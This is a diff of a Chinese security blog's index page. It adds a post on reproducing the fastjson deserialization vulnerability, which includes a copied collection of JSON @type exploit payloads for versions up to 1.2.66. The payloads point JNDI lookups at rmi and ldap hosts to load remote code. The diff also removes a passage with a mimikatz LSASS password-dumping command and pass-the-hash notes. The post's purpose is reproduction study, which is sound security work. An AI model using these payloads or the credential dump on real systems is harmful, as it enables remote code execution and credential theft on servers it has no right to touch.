@@ -153,6 +153,123 @@
     
     
     <article
+  id="post-fastjson漏洞"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/"
+    >fastjson漏洞</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-04-17T11:05:31.000Z" itemprop="datePublished">2022-04-17</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>fastjson是alibaba开源的一个json解析库，将java对象和JSON格式字符相互转换。 </p>
+<p>jackson也有这样类似功能。Spring MVC 默认采用Jackson解析Json</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
+<h3 id="原理解释："><a href="#原理解释：" class="headerlink" title="原理解释："></a>原理解释：</h3><p>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从</p>
+<p>而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据</p>
+<p>这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。</p>
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>配置环境配了两个小时。。。各种报错</p>
+<p>maven环境：<a target="_blank" rel="noopener" href="http://maven.apache.org/download.cgi">http://maven.apache.org/download.cgi</a></p>
+<p>idea 创建maven 项目</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pom.xml引入fastjson依赖</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.62&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后处理各种报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pom.xml 加入</span><br><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;defaultGoal&gt;compile&lt;&#x2F;defaultGoal&gt;.</span><br><span class="line">&lt;&#x2F;build&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后配置tomcat:<a target="_blank" rel="noopener" href="https://tomcat.apache.org/download-90.cgi">Apache Tomcat® - Apache Tomcat 9 Software Downloads</a></p>
+<p>Edit Configurations 配置：</p>
+<p><img src="/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/image-20220417224659876.png" alt="image-20220417224659876"></p>
+<p>然后配置Project Structure ：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44579869/article/details/121647812">(28条消息) IDEA出现Please,configure Web Facet first的解决方式，或者是Servlet启动后 404_扶她小藜的博客-CSDN博客_idea please</a></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/lchmyhua88/article/details/116535988">(28条消息) 在IDEA中创建maven项目，使用Fastjson 介绍json转换_华大哥的博客-CSDN博客_fastjson idea</a></p>
+<p>复现log4j2 的时候也用到了下面两个请求方式</p>
+<h3 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h3><h3 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h3><h1 id="Fastjson-多版本payload集合"><a href="#Fastjson-多版本payload集合" class="headerlink" title="Fastjson 多版本payload集合"></a>Fastjson 多版本payload集合</h1><p>copy的零组文库</p>
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://x.x.x.x:1099/jndi&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://x.x.x.x:1098/jndi&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="attr">&quot;properties&quot;</span>:&#123;<span class="attr">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://x.x.x.x:1999/Exploit&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="attr">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1098/exploit&quot;</span>&#125;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="attr">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="attr">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="attr">&quot;jndiNames&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="attr">&quot;properties&quot;</span>: &#123;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p><a target="_blank" rel="noopener" href="https://www.sec-in.com/article/950">浅谈fastjson waf Bypass思路-SecIN (sec-in.com)</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson">safe6Sec/Fastjson: Fastjson姿势技巧集合 (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
+<p>零组文库</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fastjson/" rel="tag">fastjson</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+   
+</article>
+
+    
+    <article
   id="post-Laravel"
   class="article article-type-post"
   itemscope
@@ -250,23 +367,7 @@
 <p>AAD3B435B51404EEAAD3B435B51404EE是<code>LM hash</code>   这个是之前认证使用的，现在已经不使用了</p>
 <p>31D6CFE0D16AE931B73C59D7E0C089C0是<code>NTLM hash</code></p>
 <p>在<code>域环境</code>中，机器认证是利用kerberos协议，在内网渗透中，域环境中拿到普通域用户/域管 hash，可以尝试pth。</p>
-<p>在<code>工作组</code>环境中如果两台机器如果本地administrator账号密码一样也可能可以pth（实验过）。</p>
-<p> 域环境中如果两台机器如果本地administrator账号密码一样也可能可以pth，所以这就体现<code>LAPS</code>方案重要性。</p>
-<p>LAPS：Local Administrator Password Solution是<strong>本地管理员密码</strong>解决方案</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">powershell Get-ADComputer computername -Properties ms-Mcs-AdmPwd | select name, ms-Mcs-AdmPwd</span><br><span class="line"></span><br><span class="line">如果安装可在软件列表中发现 Local Administrator Password Solution</span><br></pre></td></tr></table></figure>
-
-<p>LAPS允许您在<code>加入域</code>的情况下管理<code>本地管理员密码</code>（<code>随机</code>，唯一且定期更改）电脑。如果计算机未加入域，则将无法使用LAPS。这些密码集中存储在Active Directory中，并且仅限使用ACL的授权用户使用。使用Kerberos v5和AES从客户端到服务器的传输密码受到保护。</p>
-<p>这个功能实现的是让加域的客户端本地administrator账号密码随机化（每一台都不一样的复杂随机密码），并且随机化密码存储在AD上可以查询到，避免***者猜出一台就等于猜出一片，从客户端到服务器的传输过程采用Kerberos v5和AES保护</p>
-<h1 id="LSASS"><a href="#LSASS" class="headerlink" title="LSASS"></a>LSASS</h1><p>lsass进程内存中存储大量敏感信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encrypted passwords</span><br><span class="line">NT hashes</span><br><span class="line">LM hashes</span><br><span class="line">Kerberos tickets</span><br></pre></td></tr></table></figure>
-
-<p>通过LSASS转储来进行权限提升，数据窃取和横向移动等。</p>
-<h1 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1. mimikatz"></a>1. mimikatz</h1><p>需要<code>管理员权限</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325161740275.png" alt="image-20220325161740275"></p>
-<p>可分为两步：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug             提升权限</span><br><span class="line">sekurlsa::logonpasswords     抓密码</span><br></pre></td></tr></table></figure> 
+<p>在<code>工作组</code>环境中如果两台机器如果本地administrator账号密码一样也可能可以pth。</p> 
       <a class="article-more-link" href="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/"
         >阅读更多...</a
       >
@@ -501,7 +602,11 @@
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><p>简单来说就是传参过滤不严谨照成sql语句的拼接</p>
+  <h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>同协议同域名同端口的网站才能进行资源的获取和共享。</p>
+<h3 id="jsonp-劫持"><a href="#jsonp-劫持" class="headerlink" title="jsonp  劫持"></a>jsonp  劫持</h3><p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1319">JSONP劫持漏洞学习笔记(待补充) – 天下大木头 (wjlshare.com)</a></p>
+<p>利用<code>&lt;script&gt;</code>标签</p>
+<h3 id="core"><a href="#core" class="headerlink" title="core"></a>core</h3><p>利用Origin头</p>
+<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><p>简单来说就是传参过滤不严谨照成sql语句的拼接</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT name FROM users WHERE id = <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 
@@ -720,69 +825,6 @@
     <footer class="article-footer">
        
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/" rel="tag">内网知识学习</a></li></ul>
-
-    </footer>
-  </div>
-
-   
-   
-</article>
-
-    
-    <article
-  id="post-提权"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2022/01/16/%E6%8F%90%E6%9D%83/"
-    >提权</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2022/01/16/%E6%8F%90%E6%9D%83/" class="article-date">
-  <time datetime="2022-01-16T13:30:50.000Z" itemprop="datePublished">2022-01-16</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%8F%90%E6%9D%83/">提权</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p>[toc]</p>
-<h1 id="windows-提权"><a href="#windows-提权" class="headerlink" title="windows 提权"></a>windows 提权</h1><hr>
-<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>汇总：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
-<h5 id="提权辅助"><a href="#提权辅助" class="headerlink" title="提权辅助"></a>提权辅助</h5><p>systeminfo   查看补丁</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221104049104.png" alt="image-20220221104049104"></p>
-<p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a> 寻找提权漏洞，github下载，但提权exe需要经过免杀测试 </p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/Kernelhub">Windows提权漏洞合集</a></p> 
-      <a class="article-more-link" href="/2022/01/16/%E6%8F%90%E6%9D%83/"
-        >阅读更多...</a
-      >
-       
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li></ul>
 
     </footer>
   </div>
